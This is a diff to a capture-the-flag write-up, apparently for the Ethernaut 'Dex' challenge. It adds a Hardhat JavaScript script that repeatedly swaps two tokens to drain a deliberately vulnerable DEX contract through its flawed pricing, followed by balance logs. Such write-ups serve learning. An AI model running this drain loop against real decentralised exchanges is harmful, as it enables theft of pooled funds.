@@ -79,7 +79,75 @@ So when we break all the information we need, the solution is really clearly :
 3. Replay step 2 until we can't play anymore.
 4. Calc a litte bit and send swap the last time to achieve the goal.
 
+## Code
 
+Assign variable needed
+```javascript
+const DexAddress = "0x6BA175f02a98709D04D66D26b14376b35e5a1cE4";
+const DEXContract = await hre.ethers.getContractAt("Dex", DexAddress);
+
+[signer] = await hre.ethers.getSigners();
+signerAddress = await signer.getAddress();
+
+console.log("1/ Approving");
+const approveTX = await DEXContract.connect(signer).approve(
+    DexAddress,
+    2000
+);
+await approveTX.wait();
+
+let fromAddress = await DEXContract.token1();
+let toAddress = await DEXContract.token2();
+```
+---
+Assign wallet balance, and contract balance + function to ressign and log
+```javascript
+let fromBalance, toBalance;
+let contractFromBalance, contractToBalance;
+async function reassignBalance() {
+    fromBalance = await DEXContract.balanceOf(fromAddress, signerAddress);
+    toBalance = await DEXContract.balanceOf(toAddress, signerAddress);
+
+    contractFromBalance = await DEXContract.balanceOf(
+        fromAddress,
+        DexAddress
+    );
+    contractToBalance = await DEXContract.balanceOf(toAddress, DexAddress);
+}
+function logBalance() {
+    console.log(fromBalance.toString(), toBalance.toString());
+    console.log(
+        contractFromBalance.toString(),
+        contractToBalance.toString()
+    );
+}
+await reassignBalance();
+logBalance();
+```
+---
+Transfer like the solution above until contract out of money ( in my code it run till error :D )
+```javascript
+while (contractFromBalance > 0 && contractToBalance > 0) {
+    if (transferFromValue > fromBalance) {
+        transferFromValue = fromBalance;
+    }
+    logBalance();
+
+    const swapTX = await DEXContract.connect(signer).swap(
+        fromAddress,
+        toAddress,
+        transferFromValue
+    );
+    await swapTX.wait();
+    [fromAddress, toAddress] = [toAddress, fromAddress];
+    await reassignBalance();
+    transferFromValue = fromBalance;
+}
+console.log("End");
+
+await reassignBalance();
+logBalance();
+```
 ### Log
 ```
 10 10
@@ -111,7 +179,7 @@ Start
 45 110
 ```
 
-At the end I swap 45 token. 45*110/45 = 110. Exact the amount in the contract have.
+At the end I swap by hand 45 token. 45*110/45 = 110. Exact the amount in the contract have.
 The final log is:
 ```
 20 110
